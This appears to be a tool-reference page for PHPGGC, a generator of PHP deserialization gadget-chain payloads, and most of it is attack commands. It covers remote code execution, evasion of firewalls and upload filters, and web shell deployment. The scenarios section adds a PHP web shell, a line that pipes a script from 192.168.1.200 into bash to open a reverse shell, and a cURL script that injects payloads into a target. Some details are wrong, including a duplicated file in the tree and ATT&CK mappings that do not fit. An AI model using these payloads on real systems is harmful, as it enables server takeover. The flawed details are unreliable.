---
title: "PHPGGC (PHP Generic Gadget Chains)"
slug: "phpggc"
version: "0.20230428"
category: "Persistence"
author: "Ambionics (Charli Thomas / @s_n_t)"
license: "Apache-2.0"
repository: "https://github.com/ambionics/phpggc"
kali_page: "https://www.kali.org/tools/phpggc/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
description: "Library and tool for generating PHP unserialize() payloads using gadget chains across major frameworks"
platforms:
  - "Cross-platform (generates PHP payloads)"
tags:
  - "deserialization"
  - "php"
  - "gadget-chains"
  - "unserialize"
  - "rce"
  - "file-write"
  - "phar"
  - "persistence"
---

# PHPGGC (PHP Generic Gadget Chains)

PHPGGC is a library of `unserialize()` payloads along with a command-line tool to generate them. It is the PHP equivalent of Java's ysoserial. When encountering an `unserialize()` vulnerability on a target web application, PHPGGC generates ready-made gadget chain payloads for RCE, file write, file read, and other operations — without requiring manual gadget discovery.

## Overview

PHP deserialization vulnerabilities occur when user-controlled data is passed to PHP's `unserialize()` function. If the application has classes with `__destruct()` or `__toString()` magic methods that perform dangerous operations, an attacker can craft serialized objects that trigger those methods in a chain leading to code execution or file manipulation.

**Core Capabilities:**
- Generate payloads for 100+ gadget chains across 15+ frameworks
- RCE via function calls, command execution, or PHP code evaluation
- File write operations for web shell deployment
- File read for sensitive data exfiltration
- PHAR payload generation for trigger-based exploitation
- Wrapper system for custom payload formatting
- Chain compatibility testing across framework versions

**Supported Frameworks:**
- Laravel, Symfony, Doctrine, Drupal
- Guzzle, Monolog, SwiftMailer
- Magento, CodeIgniter4, CakePHP
- WordPress, Yii, ZendFramework
- Phalcon, Slim, Podio, Bitrix

## Installation

```bash
sudo apt update && sudo apt install -y phpggc
```

**Explanation:** Installs PHPGGC from Kali repositories. Requires PHP CLI.

### Manual Installation

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
chmod +x phpggc
```

### Docker

```bash
docker build -t phpggc https://github.com/ambionics/phpggc.git
```

## Dependencies

- **php-cli** (>= 5.6): Runtime interpreter
- **Composer**: For dependency management (manual install)

## Architecture

PHPGGC follows a modular chain architecture:

```
phpggc
├── gadgetchains/          # Framework-specific chains
│   ├── Laravel/
│   │   ├── RCE1.php       # Chain implementation
│   │   ├── RCE1.php       # Gadget definitions
│   │   └── ...
│   ├── Symfony/
│   ├── Monolog/
│   └── ...
├── lib/
│   ├── PHPGGC.php         # Core library
│   ├── GadgetChain.php    # Base chain class
│   ├── Output/
│   │   ├── PHAR/          # PHAR file generation
│   │   └── Encoders/      # Output encoders
│   └── Phar/              # PHAR format support
├── templates/             # New chain templates
└── phpggc                 # CLI entry point
```

**Chain Lifecycle:**
1. `process_parameters()` — Validate/modify input parameters
2. `generate()` — Build the object graph (gadget chain)
3. `process_object()` — Post-process the object (optional)
4. `process_serialized()` — Modify the serialized string (optional)
5. Output — Encode and display the payload

## Usage

### List Available Chains

```bash
phpggc -l
```

**Explanation:** Lists all available gadget chains with name, version, type, and vector information.

### Filter Chains by Framework

```bash
phpggc -l laravel
```

**Explanation:** Lists only Laravel gadget chains. Filters are case-insensitive substring matches.

### Chain Information

```bash
phpggc -i symfony/rce1
```

**Explanation:** Displays detailed information about a specific chain including version range, type, and usage.

### RCE (Command Execution)

```bash
phpggc Laravel/RCE1 system id
```

**Explanation:** Generates a serialized payload that executes `id` via `system()` on Laravel applications. Output the payload to stdout.

### RCE (Function Call)

```bash
phpggc Symfony/RCE4 system id
```

**Explanation:** RCE chain that calls `system()` with `id` as parameter. Function call chains pass arguments to system functions.

### RCE (PHP Code)

```bash
phpggc Monolog/RCE5 'phpinfo();'
```

**Explanation:** RCE chain that executes arbitrary PHP code. The argument is evaluated as PHP code.

### File Write

```bash
phpggc SwiftMailer/FW1 /var/www/html/shell.php /tmp/local/shell.php
```

**Explanation:** Writes the contents of `/tmp/local/shell.php` to `/var/www/html/shell.php` on the target server. Useful for deploying web shells.

### File Read

```bash
phpggc CodeIgniter4/FR1 /etc/passwd
```

**Explanation:** Reads the specified file from the target server. Output is returned in the HTTP response.

### PHAR Payload Generation

```bash
phpggc -p phar -o /tmp/output.phar Monolog/RCE1 system id
```

**Explanation:** Creates a PHAR file containing the serialized payload. Useful for `file_exists()`, `fopen()`, and other stream-wrapper triggers.

### PHAR ZIP Format

```bash
phpggc -p zip -o /tmp/output.zip.phar Monolog/RCE1 system id
```

**Explanation:** Creates a PHAR in ZIP format. Some applications restrict PHAR format but allow ZIP.

### Polyglot JPEG/PHAR

```bash
phpggc -pj /tmp/image.jpg -o /tmp/polyglot.jpg Monolog/RCE1 system id
```

**Explanation:** Creates a polyglot file that is both a valid JPEG image and a PHAR payload. Bypasses image upload restrictions.

### Base64 Encoded Output

```bash
phpggc -b Laravel/RCE1 system id
```

**Explanation:** Base64-encodes the payload. Useful for passing payloads via HTTP parameters or cookies.

### URL Encoded Output

```bash
phpggc -u Laravel/RCE1 system id
```

**Explanation:** URL-encodes the payload for HTTP GET/POST parameter injection.

### Soft URL Encoding

```bash
phpggc -s Laravel/RCE1 system id
```

**Explanation:** URL-encodes only special characters while keeping the payload readable. Good for debugging.

### Combined Encoding

```bash
phpggc -b -u -u Laravel/RCE1 system id
```

**Explanation:** Base64-encodes, then URL-encodes twice. Encoding order matters — encoders are chained left to right.

### Fast Destruct

```bash
phpggc -f Laravel/RCE1 system id
```

**Explanation:** Applies the fast-destruct technique so the object is destroyed immediately after `unserialize()`, not at script end. Improves reliability for `__destruct` vectors.

### ASCII Strings

```bash
phpggc -a Laravel/RCE1 system id
```

**Explanation:** Replaces non-ASCII characters with hex representations (`S` serialization format). Prevents null byte issues in text transports.

### Armor Strings

```bash
phpggc -A Laravel/RCE1 system id
```

**Explanation:** Replaces ALL characters with hex representations. Bypasses firewalls that inspect string content. Triples payload size.

### Plus Numbers (Bypass)

```bash
phpggc -n Os Laravel/RCE1 system id
```

**Explanation:** Adds `+` before object size numbers (`O:3:` → `O:+3:`), bypassing regex checks for `/O:[0-9]+:/`. PHP 7.2+ only supports this for `i` and `d` types.

### Output to File

```bash
phpggc -o /tmp/payload.txt Laravel/RCE1 system id
```

**Explanation:** Writes the serialized payload to a file instead of stdout.

### Wrapper for Custom Formats

```bash
phpggc -w /tmp/my_wrapper.php Slim/RCE1 system id
```

**Explanation:** Applies a custom PHP wrapper that modifies parameters, object structure, or serialized output. Useful when the vulnerable code expects a specific data structure.

### Test Chain Compatibility

```bash
phpggc Monolog/RCE2 --test-payload
```

**Explanation:** Tests if the gadget chain works in the current PHP environment. Requires the target framework's vendor directory. Returns exit code 0 on success, 1 on failure.

### Version Compatibility Testing

```bash
python3 test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3
```

**Explanation:** Tests which versions of a package a gadget chain works against. Generates a compatibility matrix.

```bash
python3 test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1
```

**Explanation:** Tests specific versions of a package against gadget chains.

### Create New Chain Template

```bash
phpggc -N Drupal RCE
```

**Explanation:** Creates the directory and file structure for a new Drupal RCE gadget chain.

### Programmatic API

```php
<?php
include("phpggc/lib/PHPGGC.php");

$gc = new \GadgetChain\Guzzle\RCE1();
$parameters = $gc->process_parameters([
    'function' => 'system',
    'parameter' => 'id',
]);
$object = $gc->generate($parameters);
$object = $gc->process_object($object);
$serialized = serialize($object);
$serialized = $gc->process_serialized($serialized);
print($serialized . "\n");

// Create PHAR from payload
$phar = new \PHPGGC\Phar\Tar($serialized);
file_put_contents('output.phar.tar', $phar->generate());
```

**Explanation:** Programmatic interface for integrating PHPGGC into custom exploit scripts or automated testing frameworks.

## Gadget Chain Reference

### Laravel

| Chain | Version | Type | Vector | Notes |
|-------|---------|------|--------|-------|
| Laravel/RCE1 | 5.4.27 | RCE (Function call) | __destruct | |
| Laravel/RCE2 | 5.4.0-8.6.9+ | RCE (Function call) | __destruct | |
| Laravel/RCE3 | 5.5.0-5.8.35 | RCE (Function call) | __destruct | Requires auth |
| Laravel/RCE4 | 5.4.0-8.6.9+ | RCE (Function call) | __destruct | |
| Laravel/RCE5 | 5.8.30 | RCE (PHP code) | __destruct | Requires auth |
| Laravel/RCE7 | <=8.16.1 | RCE (Function call) | __destruct | Requires auth |
| Laravel/RCE10 | 5.6.0-9.1.8+ | RCE (Function call) | __toString | |

### Symfony

| Chain | Version | Type | Vector | Notes |
|-------|---------|------|--------|-------|
| Symfony/RCE1 | 3.3 | RCE (PHP code) | __destruct | proc_open() |
| Symfony/RCE3 | 3.3 | RCE (Function call) | __destruct | |
| Symfony/RCE4 | 3.3 | RCE (Function call) | __destruct | |
| Symfony/RCE5 | 3.4-4.3 | RCE (Function call) | __destruct | |
| Symfony/RCE7 | 4.3.4+ | RCE (Function call) | __destruct | |

### Monolog

| Chain | Version | Type | Vector | Notes |
|-------|---------|------|--------|-------|
| Monolog/RCE1 | 1.x | RCE (Function call) | __destruct | |
| Monolog/RCE2 | 1.x | RCE (Function call) | __destruct | |
| Monolog/RCE3 | 1.x-2.x | RCE (Function call) | __destruct | |
| Monolog/RCE5 | 2.x | RCE (Function call) | __destruct | |
| Monolog/RCE9 | 2.x-3.x | RCE (Function call) | __toString | |

### Doctrine

| Chain | Version | Type | Vector | Notes |
|-------|---------|------|--------|-------|
| Doctrine/FW1 | any | File write | __toString | |
| Doctrine/FW2 | 2.3-2.8.5 | File write | __destruct | |
| Doctrine/RCE1 | 1.5.1-2.7.2 | RCE (PHP code) | __destruct | |
| Doctrine/RCE2 | 1.11-2.3.2 | RCE (Function call) | __destruct | |

### Other Frameworks

| Chain | Framework | Type | Vector |
|-------|-----------|------|--------|
| SwiftMailer/FW1 | SwiftMailer | File write | __destruct |
| SwiftMailer/FW2 | SwiftMailer | File write | __toString |
| WordPress/RCE1 | WordPress | RCE (Function call) | __destruct |
| Drupal7/RCE1 | Drupal 7 | RCE (PHP code) | __destruct |
| Magento/RCE1 | Magento | RCE (Function call) | __destruct |
| CodeIgniter4/RCE1 | CodeIgniter 4 | RCE (Function call) | __destruct |
| CakePHP/RCE1 | CakePHP | RCE (Command) | __destruct |
| Yii/RCE1 | Yii Framework | RCE (Function call) | __destruct |
| ZendFramework/RCE1 | Zend Framework | RCE (Function call) | __destruct |
| Slim/RCE1 | Slim Framework | RCE (Function call) | __destruct |

## Encoders

| Encoder | Flag | Description |
|---------|------|-------------|
| Soft URL | `-s` | URL-encodes special chars, keeps payload readable |
| URL | `-u` | Full URL encoding |
| Base64 | `-b` | Base64 encoding |
| JSON | `-j` | JSON wrapping |

**Encoding Order:** Encoders are chained left to right. `phpggc -b -u` base64s first, then URL-encodes.

## Limitations

- **Target must have the vulnerable framework**: The gadget chain requires specific classes to exist in the target application's vendor directory.
- **Version-specific**: Chains work only against specific framework versions. Always test compatibility.
- **Autoloading required**: The target must autoload the classes used in the chain.
- **No null byte issues**: Serialized payloads contain null bytes. Use encoders (`-b`, `-u`) for transport.
- **PHAR requires specific triggers**: PHAR payloads only work with functions that interact with the stream wrapper (`file_exists`, `fopen`, `include`, etc.).
- **Auth restrictions**: Some Laravel/Symfony chains require authenticated sessions.
- **PHP version**: Requires PHP >= 5.6 to run. Chains target specific PHP versions.

## Detection Indicators

- Suspicious serialized data in HTTP parameters (`O:`, `a:`, `s:`)
- PHAR files uploaded to web-accessible directories
- Unusual base64-encoded payloads in cookies or POST data
- PHP `unserialize()` calls in application logs
- Gadget chain class names in serialized strings
- File writes or RCE after deserialization endpoints

## MITRE ATT&CK Mapping

- **T1554** - Compromise Client Software Binary
- **T1195.002** - Supply Chain Compromise: Software Supply Chain
- **T1059.005** - Command and Scripting Interpreter: Visual Basic
- **T1203** - Exploitation for Client Execution
- **T1505.003** - Server Software Component: Web Shell

## Practical Scenarios

### Laravel RCE

```bash
# Generate payload for Laravel 8.x
phpggc Laravel/RCE2 system "cat /etc/passwd" | base64
# Inject via vulnerable cookie, session, or API parameter
```

**Explanation:** Generates a Laravel RCE payload, base64-encodes it for injection into a cookie or POST parameter that gets deserialized.

### Symfony RCE

```bash
# Generate PHP code execution payload
phpggc Symfony/RCE2 'file_put_contents("/var/www/html/shell.php", "<?php system($_GET[\"c\"]); ?>");'
```

**Explanation:** Writes a web shell to the Symfony application's web root via PHP code execution chain.

### File Write to Web Shell

```bash
# Create a local web shell
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
# Generate file write payload
phpggc Doctrine/FW2 /var/www/html/uploads/shell.php /tmp/shell.php
```

**Explanation:** Uses Doctrine's file write chain to deploy a web shell through the deserialization vulnerability.

### PHAR Trigger

```bash
# Create PHAR payload
phpggc -p phar -o /tmp/payload.phar Monolog/RCE1 system "id"
# Upload via image upload or file inclusion
# Trigger via: file_exists($_GET['f']) or fopen($_GET['f'])
```

**Explanation:** Creates a PHAR payload that triggers code execution when passed to filesystem functions.

### WordPress Plugin RCE

```bash
# Generate WordPress gadget chain payload
phpggc WordPress/RCE1 system "curl http://192.168.1.200/rev.sh | bash"
```

**Explanation:** Executes a reverse shell script on WordPress through an insecure deserialization vulnerability in a plugin.

### Automated Exploitation Script

```php
<?php
$payload = shell_exec("phpggc Laravel/RCE1 system 'id'");
// Inject into vulnerable endpoint
$ch = curl_init("http://target.example.com/api/endpoint");
curl_setopt($ch, CURLOPT_COOKIE, "session=" . base64_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
echo curl_exec($ch);
```

**Explanation:** Automates payload generation and injection using PHP's cURL and PHPGGC's command-line interface.

## Related Tools

- **ysoserial**: Java deserialization gadget chain generator (equivalent)
- **marshalsec**: Java unmarshalling attacks
- **php-serialize**: PHP serialization library
- **phpggc phar-ggc**: PHAR exploitation fork
- **SQLMap**: Can detect and exploit deserialization in SQL injection contexts

## Resources

- [GitHub Repository](https://github.com/ambionics/phpggc)
- [Kali Linux Package](https://www.kali.org/tools/phpggc/)
- [Ambionics Blog](https://ambionics.io/blog/)
- [BlackHat US 2018 PHARGGC Paper](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
- [PHP Deserialization Guide](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [MITRE ATT&CK TA0003](https://attack.mitre.org/tactics/TA0003/)
